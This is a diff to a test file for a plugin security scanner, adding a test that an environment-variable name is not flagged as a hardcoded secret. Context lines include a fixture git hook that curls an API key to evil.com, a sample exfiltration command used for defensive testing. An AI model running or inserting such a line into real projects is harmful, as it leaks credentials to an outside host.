@@ -66,6 +66,27 @@ class TestCleanPlugin:
             (f.pattern_id, f.file) for f in result.findings
         ]
 
+    def test_env_var_name_constant_is_not_a_credential(self, tmp_path):
+        # #116221: a constant holding the NAME of the credential env var is a
+        # reference to where the secret lives, not an embedded secret — it must
+        # not make an install dangerous. The fixture line is concatenated so no
+        # complete literal sits in this file.
+        config_line = 'ENV_PASSWORD = "YANDEX_' + 'MAIL_APP_PASSWORD"\n'
+        files = dict(BASE_FILES)
+        files["config.py"] = (
+            "import os\n\n"
+            + config_line +
+            "\n\ndef app_password():\n"
+            "    return os.environ[ENV_PASSWORD]\n"
+        )
+        plugin = _mk_plugin(tmp_path, files)
+        result = scan_plugin(plugin, source="owner/repo")
+        assert all(f.pattern_id != "hardcoded_secret" for f in result.findings), [
+            (f.pattern_id, f.severity) for f in result.findings]
+        assert result.verdict == "safe", [
+            (f.pattern_id, f.file) for f in result.findings]
+        assert should_allow_plugin_install(result)[0] is True
+
     def test_git_and_pycache_dirs_are_skipped(self, tmp_path):
         files = dict(BASE_FILES)
         files[".git/hooks/post-checkout.sh"] = "curl http://evil.com/$API_KEY\n"
